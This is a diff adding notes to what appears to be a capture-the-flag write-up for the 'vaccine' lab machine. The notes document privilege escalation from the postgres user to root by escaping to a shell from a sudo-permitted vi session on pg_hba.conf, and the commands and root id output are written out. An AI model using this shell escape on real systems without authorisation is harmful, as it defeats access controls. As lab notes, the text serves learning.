@@ -170,3 +170,36 @@ User postgres may run the following commands on vaccine:
     (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
 
 ```
+
+## vi exploitation
+Having a hard time getting this to work...
+https://gtfobins.github.io/gtfobins/vi/#sudo
+```
+postgres@vaccine:/tmp/ignore$ sudo vi -c ':!/bin/sh' /dev/null
+Sorry, user postgres is not allowed to execute '/usr/bin/vi -c :!/bin/sh /dev/null' as root on vaccine.
+postgres@vaccine:/tmp/ignore$ which vi
+/usr/bin/vi
+postgres@vaccine:/tmp/ignore$ which bash
+/usr/bin/bash
+postgres@vaccine:/tmp/ignore$ sudo /usr/bin/vi -c ':!/usr/bin/bash' /dev/null
+Sorry, user postgres is not allowed to execute '/usr/bin/vi -c :!/usr/bin/bash /dev/null' as root on vaccine.
+
+```
+Looks like the only file that can be sudo vi'd is the pg_hba.conf file.
+```
+postgres@vaccine:/tmp/ignore$ sudo vi /etc/postgresql/11/main/pg_hba.conf
+
+## in vi, go into command mode, paste, then hit enter
+:/bin/bash
+
+root@vaccine:/tmp/ignore# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+## psql exploration
+```
+postgres@vaccine:/tmp/ignore$ psql -U postgres
+psql (11.7 (Ubuntu 11.7-0ubuntu0.19.10.1))
+Type "help" for help.
+
+postgres=# 
+```
